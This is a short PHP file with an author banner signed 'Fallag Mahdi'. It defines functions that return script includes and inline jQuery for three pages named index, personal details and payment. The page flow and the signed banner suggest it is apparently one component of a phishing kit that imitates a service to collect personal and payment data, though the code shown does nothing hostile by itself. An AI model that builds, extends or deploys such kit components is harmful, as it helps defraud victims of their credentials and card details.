<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
function js_index() {
	$ara = array("file" => '<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script><script type="text/javascript" src="M/js1.js"></script>',
				 "code" => '$("input").change(function () {$(this).removeClass("merror");}).trigger("change");');
	return $ara;
}
function js_perso() {
	$ara = array("file" => '<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script><script type="text/javascript" src="M/js2.js"></script>
	<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script><script type="text/javascript" src="//raw.github.com/jpillora/verifyjs/gh-pages/dist/verify.notify.min.js"></script>',
				 "code" => '$("input").change(function () {$(this).removeClass("merror");}).trigger("change");');
	return $ara;
}
function js_pay() {
	$ara = array("file" => '<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script><script type="text/javascript" src="M/js6.js"></script>
	<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script><script type="text/javascript" src="//raw.github.com/jpillora/verifyjs/gh-pages/dist/verify.notify.min.js"></script>',
				 "code" => '$( "th" ).remove( ":contains(\'Action\')" );$("#fmtoremove").parent().addClass("frtoremove");$("#fmtoremove").remove();$(".frtoremove").remove();');
	return $ara;
}
